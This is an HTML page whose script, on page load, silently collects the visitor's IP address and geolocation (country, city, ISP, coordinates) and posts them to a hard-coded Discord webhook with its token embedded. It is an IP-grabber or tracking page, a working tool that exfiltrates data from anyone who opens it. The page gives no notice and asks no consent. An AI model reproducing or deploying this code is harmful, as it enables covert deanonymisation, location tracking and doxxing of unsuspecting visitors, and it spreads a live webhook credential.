<!DOCTYPE html>
<html>
<head>
    <title>Get IP and Send to Discord</title>
</head>
<body>
    <script>
        // Function to get the user's IP address and location
        async function getIPandLocation() {
            try {
                // Fetch the IP address
                let ipResponse = await fetch('https://api.ipify.org?format=json');
                let ipData = await ipResponse.json();
                let ip = ipData.ip;

                // Fetch the geolocation data using api.iplocation.net
                let locationResponse = await fetch(`https://api.iplocation.net/?ip=${ip}`);
                let locationData = await locationResponse.json();
                return { ip: ip, location: locationData };
            } catch (error) {
                console.error('Error getting IP and location:', error);
                return null;
            }
        }

        // Function to send the IP address and location to a Discord webhook
        async function sendToDiscord(data) {
            const webhookUrl = 'https://discord.com/api/webhooks/1266889183943987321/oDW3IA3FDUMxvAlrRhj5c1f7xfTmSP6sTOBFCQUtaFAS_TwdGNQBLs0oMHbGyfamXVL_'; // Replace with your Discord webhook URL
            const location = data.location || {};
            const imageURL = "https://i.ibb.co/JCPBJzB/image.png";

            const payload = {
                content: null,
                embeds: [
                    {
                        color: null,
                        fields: [
                            {
                                name: "IP:",
                                value: `${data.ip}`
                            },
                            {
                                name: "Location:",
                                value: `IP Address:\n${data.ip}\n\n` +
                                       `Country:\n${location.country_name || 'N/A'}\n\n` +
                                       `Region:\n${location.region_name || 'N/A'}\n\n` +
                                       `City:\n${location.city || 'N/A'}\n\n` +
                                       `ISP:\n${location.isp || 'N/A'}\n\n` +
                                       `Organization:\n${location.organization || 'N/A'}\n\n` +
                                       `Latitude:\n${location.latitude || 'N/A'}\n\n` +
                                       `Longitude:\n${location.longitude || 'N/A'}`
                            }
                        ],
                        author: {
                            name: "IP & Info"
                        },
                        thumbnail: {
                            url: imageURL
                        }
                    }
                ],
                attachments: []
            };

            try {
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error('Error sending to Discord:', error);
            }
        }

        // Main function to get IP and location and send it
        async function main() {
            const data = await getIPandLocation();
            if (data) {
                await sendToDiscord(data);
            }
        }

        // Execute the main function on page load
        window.onload = main;
    </script>
</body>
</html>
